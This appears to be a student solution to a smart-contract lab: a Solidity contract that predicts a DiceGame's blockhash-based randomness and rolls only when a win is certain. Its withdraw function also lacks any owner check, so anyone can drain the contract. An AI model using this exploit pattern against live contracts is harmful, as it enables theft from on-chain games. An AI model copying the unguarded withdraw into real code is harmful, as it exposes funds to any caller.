pragma solidity >=0.8.0 <0.9.0; //Do not change the solidity version as it negativly impacts submission grading
//SPDX-License-Identifier: MIT

import "hardhat/console.sol";
import "./DiceGame.sol";
import "@openzeppelin/contracts/access/Ownable.sol";

contract RiggedRoll is Ownable {
	DiceGame public diceGame;

	constructor(address payable diceGameAddress) {
		diceGame = DiceGame(diceGameAddress);
	}

	error NotEnoughEther();
	error AmountSpecifiedGreaterThanBalance();
	//This event is required so that the rolling dice animation on frontend UI stops
	//Without this, is the roll is not in the winnable range the rolling dice animation will not stop
	event DiceRolled(bool rolled);

	// `withdraw` function to transfer Ether from the rigged contract to a specified address.

	function withdraw(address _addr, uint256 _amount) external {
		uint256 totBalance = address(this).balance;
		if (_amount > totBalance) {
			revert AmountSpecifiedGreaterThanBalance();
		}
		(bool success, ) = payable(_addr).call{ value: _amount }("");
		require(success, "balance not sent to owner");
	}

	// Create the `riggedRoll()` function to predict the randomness in the DiceGame contract and only initiate a roll when it guarantees a win.
	function riggedRoll() external {
		//If the contract does not have sufficient balance then it cannot roll the dice
		if (address(this).balance < 0.002 ether) {
			revert NotEnoughEther();
		}
		uint256 valToSend = 0.002 ether;
		uint256 diceNonce = diceGame.nonce(); //Get then nonce from diceGame to use it for `roll` calc
		bytes32 prevHash = blockhash(block.number - 1);
		bytes32 rollHash = keccak256(
			abi.encodePacked(prevHash, address(diceGame), diceNonce)
		);
		uint256 roll = uint256(rollHash) % 16;
		//If roll is not in the winning range then return

		if (roll > 5) {
			emit DiceRolled(false);
			revert();
		}
		//As the roll is in the winning range, roll the dice

		diceGame.rollTheDice{ value: valToSend }();
	}

	// Include the `receive()` function to enable the contract to receive incoming Ether.
	receive() external payable {}

	fallback() external payable {}
}
